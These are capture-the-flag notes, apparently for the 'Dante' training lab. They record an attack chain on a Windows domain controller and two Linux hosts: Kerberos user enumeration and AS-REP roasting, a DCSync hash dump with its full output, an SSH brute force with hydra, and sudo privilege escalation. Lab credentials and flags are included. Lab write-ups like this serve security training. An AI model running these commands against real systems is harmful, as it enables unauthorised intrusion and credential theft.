### Set up double pivots with ligolo to access below network

## 172.16.2.5
- DANTE.ADMIN\DANTE-DC02 Windows 10 / Server 2019 Build 17763 x64
```
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
```

- `kerbrute userenum -d DANTE.ADMIN old-emps.txt --dc 172.16.2.5`
    - `jbercov@DANTE.ADMIN`
- `impacket-GetNPUsers DANTE.ADMIN/ -dc-ip 172.16.2.5 -no-pass -usersfile old-emps.txt`
    - `jbercov:myspace7`

- `evil-winrm -i 172.16.2.5 -u jbercov -p myspace7`
    - to get flag - DANTE{Im_too_hot_Im_K3rb3r045TinG!}

- `icacls C:\Users\jbercov\.ssh /grant jbercov:F`
- In documents, found a `jenkins.bat`
    - `Admin_129834765:SamsungOctober102030`
    - PWNED jenkins box

- lsass running as pid 700
- Run bloodhound and check `Shortest Path to Domain Admin` - try both nxc and sharphound ingestors
    - `shows we can dcsync`
- `impacket-secretsdump 'DANTE.ADMIN'/'jbercov':'myspace7'@172.16.2.5`
```
impacket-secretsdump 'DANTE.ADMIN'/'jbercov':'myspace7'
@172.16.2.5
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2e5f00bc433acee0ae72f622450bd63c:::
DANTE.ADMIN\jbercov:1106:aad3b435b51404eeaad3b435b51404ee:2747def689b576780fe2339fd596688c:::
sshd:6101:aad3b435b51404eeaad3b435b51404ee:9f2e78d0e3ec355b89ae751119bc520f:::
DANTE-DC02$:1000:aad3b435b51404eeaad3b435b51404ee:42395981bc973d3fd290d4b2264c688a:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:0652a9eb0b8463a8ca287fc5d099076fbbd5f1d4bc0b94466ccbcc5c4a186095
Administrator:aes128-cts-hmac-sha1-96:08f140624c46af979044dde5fff44cfd
Administrator:des-cbc-md5:8ac752cea84f4a10
krbtgt:aes256-cts-hmac-sha1-96:a696318416d7e5d58b1b5763f1a9b7f2aa23ca743ac3b16990e5069426d4bc46
krbtgt:aes128-cts-hmac-sha1-96:783ecc93806090e2b21d88160905dc36
krbtgt:des-cbc-md5:dcbff8a80b5b343e
DANTE.ADMIN\jbercov:aes256-cts-hmac-sha1-96:5b4b2e67112ac898f13fc8b686c07a43655c5b88c9ba7e5b48b1383bc5b3a3b6
DANTE.ADMIN\jbercov:aes128-cts-hmac-sha1-96:489ca03ed99b1cb73e7a28c242328d0d
DANTE.ADMIN\jbercov:des-cbc-md5:c7e08938cb7f929d
sshd:aes256-cts-hmac-sha1-96:89e9acb523fb00c1f44a1684ccf630bbb4b3e04e0dddc7b3d41e6005ec1e2fb8
sshd:aes128-cts-hmac-sha1-96:55e33b03fe84a881ea7afa785d4e9aa1
sshd:des-cbc-md5:8cabf7832c9b4f83
DANTE-DC02$:aes256-cts-hmac-sha1-96:68b3a5fcf455e32236aee12b5c05eadcb8bc057f70d98b363ea6b653df1a0e8f
DANTE-DC02$:aes128-cts-hmac-sha1-96:c764d43d2faf8ba894fd56e59999a33e
DANTE-DC02$:des-cbc-md5:2f38ea79a137e39e
[*] Cleaning up... 
```
- to get flag DANTE{DC_or_Marvel?}

- 172.16.2.101 is pingable from here
- setting up ligolo3

<hr>

## 172.16.2.101 - (Linux DANTE-ADMIN-NIX05) 
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20d08e88eedbb4cf35b7dbcb74a0500b (RSA)
|   256 db33b77b64704612290236b3c5cf963d (ECDSA)
|_  256 66bb0d63a81e4c24fe2c7e9e3a0300e6 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- `hydra -L users.txt -P passwords.txt 172.16.2.101 ssh -t 2` 
    - `julian:manchesterunited`
- exploit already present to give root and flag - DANTE{0verfl0wing_l1k3_craz33!}

<hr>


## 172.16.2.6 - (LINUX DANTE-ADMIN-NIX06)
- only port 22 open
- same creds `julian:manchesterunited` work
- get flag - DANTE{H1ding_1n_th3_c0rner}
- Side QUESTS
```
Hi Julian
I've put this on your personal desktop as its probably the most secure 
place on the network!

Can you please ask Sophie to change her SQL password when she logs in
again? I've reset it to TerrorInflictPurpleDirt996655 as it stands, but
obviously this is a tough one to remember

Maybe we should all get password managers?

Thanks,
James
```

**PRIVESC**
- found user `plongbottom`
    - `su plongbottom`:`PowerfixSaturdayClub777` - get password from old-emps.txt
- `sudo -l` - can run all commands as root
- `sudo su` to get root
    - DANTE{Alw4ys_check_th053_group5}
